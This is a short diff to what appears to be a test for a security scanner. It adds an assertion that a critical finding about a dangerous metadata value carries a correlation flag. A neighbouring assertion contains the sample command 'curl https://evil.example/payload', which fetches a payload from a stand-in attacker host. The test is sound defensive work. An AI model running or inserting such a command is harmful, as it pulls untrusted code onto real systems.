@@ -67,6 +67,7 @@ def test_scan_safe_metadata_key_dangerous_value_is_not_skipped(tmp_path: Path) -
     ]
     assert len(correlated) == 1
     assert correlated[0].severity == IssueSeverity.CRITICAL
+    assert correlated[0].details["same_fragment_correlation"] is True
     assert "curl https://evil.example/payload" in repr(correlated[0].details)
     assert len(path_references) == 1
 
